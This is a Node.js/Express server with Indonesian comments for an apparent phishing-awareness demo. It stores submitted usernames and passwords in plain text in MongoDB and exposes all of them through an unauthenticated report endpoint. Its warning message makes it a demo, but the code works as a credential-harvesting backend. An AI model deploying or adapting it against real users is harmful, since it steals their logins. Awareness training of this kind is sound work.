const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
app.use(cors());
app.use(bodyParser.json());

// 🔗 Koneksi ke MongoDB
mongoose.connect('mongodb://localhost:27017/phishing_demo', {
    useNewUrlParser: true,
    useUnifiedTopology: true
});

// 📌 Schema
const CredentialSchema = new mongoose.Schema({
    username: String,
    password: String,
    createdAt: { type: Date, default: Date.now }
});

const Credential = mongoose.model('Credential', CredentialSchema);

// 📩 Endpoint untuk simpan data
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    const cred = new Credential({ username, password });
    await cred.save();

    res.json({
        message: "⚠️ Peringatan! Kamu baru saja memasukkan data ke halaman palsu!",
        data: { username, password }
    });
});

// 📤 Endpoint untuk ambil semua data
app.get('/api/report', async (req, res) => {
    const creds = await Credential.find().sort({ createdAt: -1 });
    res.json(creds);
});

// 🚀 Jalankan server
const PORT = 5000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server berjalan di http://0.0.0.0:${PORT}`);
});
